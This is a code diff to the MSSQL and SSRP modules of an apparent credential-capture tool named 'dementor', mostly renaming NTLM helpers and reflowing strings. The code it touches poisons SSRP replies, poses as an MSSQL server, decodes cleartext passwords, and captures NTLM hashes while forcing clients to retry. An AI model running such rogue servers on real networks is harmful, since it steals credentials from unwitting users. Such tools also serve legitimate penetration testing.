@@ -45,14 +45,15 @@ from caterpillar.py import (
 
 from dementor.config.session import SessionConfig
 from dementor.loader import BaseProtocolModule, DEFAULT_ATTR
-from dementor.db import _CLEARTEXT
+from dementor.db import CLEARTEXT
 from dementor.config.toml import TomlConfig, Attribute as A
+from dementor.config.util import HostDerivedValue
 from dementor.log.hexdump import hexdump
 from dementor.log.logger import ProtocolLogger
 from dementor.protocols.ntlm import (
-    NTLM_build_challenge_message,
-    NTLM_handle_authenticate_message,
-    NTLM_handle_negotiate_message,
+    ntlm_build_challenge_message,
+    ntlm_handle_authenticate_message,
+    ntlm_handle_negotiate_message,
 )
 from dementor.servers import (
     BaseProtoHandler,
@@ -126,7 +127,13 @@ class SVR_RESP_DAC:
 class SSRPConfig(TomlConfig):
     _section_ = "SSRP"
     _fields_ = [
-        A("ssrp_server_name", "MSSQL.FQDN", "DEMENTOR"),
+        A(
+            "ssrp_server_name",
+            "MSSQL.Host",
+            None,
+            section_local=False,
+            factory=HostDerivedValue("FQDN", "DEMENTOR"),
+        ),
         A("ssrp_server_version", "MSSQL.Version", "9.00.1399.06"),
         A("ssrp_server_instance", "MSSQL.InstanceName", "MSSQLServer"),
         A("ssrp_instance_config", "InstanceConfig", ""),
@@ -189,7 +196,10 @@ class SSRPPoisoner(BaseProtoHandler):
             )
             resp = SVR_RESP(
                 data=(
-                    f"ServerName;{self.config.ssrp_config.ssrp_server_name};InstanceName;{instance_name};IsClustered;No;Version;{self.config.ssrp_config.ssrp_server_version};tcp;{self.config.mssql_config.mssql_port}{self.config.ssrp_config.ssrp_instance_config};;"
+                    f"ServerName;{self.config.ssrp_config.ssrp_server_name};"
+                    f"InstanceName;{instance_name};IsClustered;No;Version;"
+                    f"{self.config.ssrp_config.ssrp_server_version};tcp;"
+                    f"{self.config.mssql_config.mssql_port}{self.config.ssrp_config.ssrp_instance_config};;"
                 )
             )
             self.send(pack(resp))
@@ -209,7 +219,13 @@ class MSSQLConfig(TomlConfig):
     _fields_ = [
         A("mssql_port", "Port", 1433),
         A("mssql_server_version", "Version", "9.00.1399.06"),
-        A("mssql_fqdn", "FQDN", "DEMENTOR", section_local=False),
+        A(
+            "mssql_fqdn",
+            "Host",
+            None,
+            section_local=False,
+            factory=HostDerivedValue("FQDN", "DEMENTOR"),
+        ),
         A("mssql_instance", "InstanceName", "MSSQLSerevr"),
         A("mssql_error_code", "ErrorCode", 1205),  # LK_VICTIM
         A("mssql_error_state", "ErrorState", 1),
@@ -356,11 +372,13 @@ class MSSQLHandler(BaseProtoHandler):
             tds.TDS_ENCRYPT_ON,
         ):
             self.logger.display(
-                f"Pre-Login request for [i]{escape(instance)}[/] ([bold red]Encryption requested[/])"
+                f"Pre-Login request for [i]{escape(instance)}[/] "
+                f"([bold red]Encryption requested[/])"
             )
         else:
             self.logger.display(
-                f"PreLogin request for [i]{escape(instance)}[/] (version: {unpack(PL_OPTION_TOKEN_VERSION, version)})"
+                f"PreLogin request for [i]{escape(instance)}[/] "
+                f"(version: {unpack(PL_OPTION_TOKEN_VERSION, version)})"
             )
 
         pre_login = tds.TDS_PRELOGIN()
@@ -399,7 +417,7 @@ class MSSQLHandler(BaseProtoHandler):
             cleartext_password = self.decode_password(password)
             self.config.db.add_auth(
                 client=self.client_address,
-                credtype=_CLEARTEXT,
+                credtype=CLEARTEXT,
                 username=username,
                 password=cleartext_password,
                 logger=self.logger,
@@ -419,8 +437,8 @@ class MSSQLHandler(BaseProtoHandler):
                 self.send_error(packet)
                 return 1
 
-            self.negotiate_fields = NTLM_handle_negotiate_message(negotiate, self.logger)
-            self.challenge = NTLM_build_challenge_message(
+            self.negotiate_fields = ntlm_handle_negotiate_message(negotiate, self.logger)
+            self.challenge = ntlm_build_challenge_message(
                 negotiate,
                 challenge=self.config.ntlm_challenge,
                 nb_computer=self.config.ntlm_nb_computer,
@@ -443,6 +461,12 @@ class MSSQLHandler(BaseProtoHandler):
         return 1  # terminate connection
 
     def handle_sspi(self, packet: tds.TDSPacket) -> int:
+        """Handle TDS SSPI (type 17) auth packet; always terminates the session.
+
+        Captures the NTLM hash, then forces a login error so the client
+        retries (which may produce additional credential material). Return
+        value is always 1 (terminate) — SSPI auth is never continued.
+        """
         raw_data = packet["Data"]
         try:
             auth_message = ntlm.NTLMAuthChallengeResponse()
@@ -452,7 +476,7 @@ class MSSQLHandler(BaseProtoHandler):
             self.send_error(packet)
             return 1
 
-        NTLM_handle_authenticate_message(
+        ntlm_handle_authenticate_message(
             auth_message,
             challenge=self.challenge["challenge"],
             client=self.client_address,
@@ -521,7 +545,7 @@ class MSSQL(BaseProtocolModule[MSSQLConfig]):
     @override
     def create_server_thread(
         self, session: SessionConfig, server_config: MSSQLConfig
-    ) -> BaseServerThread:
+    ) -> BaseServerThread[MSSQLConfig]:
         return ServerThread(session, server_config, MSSQLServer)
 
 
@@ -535,5 +559,5 @@ class SSRP(BaseProtocolModule[SSRPConfig]):
     @override
     def create_server_thread(
         self, session: SessionConfig, server_config: SSRPConfig
-    ) -> BaseServerThread:
+    ) -> BaseServerThread[SSRPConfig]:
         return ServerThread(session, server_config, SSRPServer)
